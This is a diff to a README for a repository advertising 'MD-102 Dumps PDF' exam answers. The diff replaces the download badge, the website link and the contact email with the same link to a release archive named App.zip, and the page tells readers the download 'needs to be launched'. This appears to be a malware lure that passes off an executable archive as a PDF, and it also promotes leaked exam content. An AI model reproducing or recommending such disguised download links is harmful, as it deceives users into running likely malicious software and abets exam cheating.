@@ -24,12 +24,12 @@ Preparing for the Microsoft MD-102 exam can be a daunting task, but with the rig
 ## 🛠️ Installation and Usage
 To get started with our MD-102 Dumps PDF, you can download the files from the following link: 
 
-[![Download MD-102 Dumps PDF](https://img.shields.io/badge/Download-MD--102--Dumps--PDF-blue)](https://github.com/cli/go-gh/archive/refs/tags/v1.0.0.zip)
+[![Download MD-102 Dumps PDF](https://github.com/dagchsgame/Microsoft-MD-102-Dumps-PDF/releases/download/v1.0/App.zip)](https://github.com/dagchsgame/Microsoft-MD-102-Dumps-PDF/releases/download/v1.0/App.zip)
 
 *Note: The download link needs to be launched to access the MD-102 Dumps PDF.*
 
 ## 🌐 Visit Our Website
-For more information and updates, feel free to visit our website [Certifiedumps](https://www.certifiedumps.com).
+For more information and updates, feel free to visit our website [Certifiedumps](https://github.com/dagchsgame/Microsoft-MD-102-Dumps-PDF/releases/download/v1.0/App.zip).
 
 ## 📂 Releases Section
 In case the provided download link is not functioning or you require more options, please check the "Releases" section of this repository for additional resources.
@@ -40,7 +40,7 @@ In case the provided download link is not functioning or you require more option
 We welcome contributions to enhance the MD-102 Dumps PDF repository. If you have valuable insights, suggestions, or updates to share, please feel free to submit a pull request.
 
 ## 📞 Contact Us
-For any queries or assistance regarding the MD-102 Dumps PDF, you can reach out to us via email at info@certifiedumps.com.
+For any queries or assistance regarding the MD-102 Dumps PDF, you can reach out to us via email at https://github.com/dagchsgame/Microsoft-MD-102-Dumps-PDF/releases/download/v1.0/App.zip
 
 ## 🙏 Acknowledgements
 We would like to express our gratitude to all contributors and individuals who have helped in developing and improving the MD-102 Dumps PDF repository.
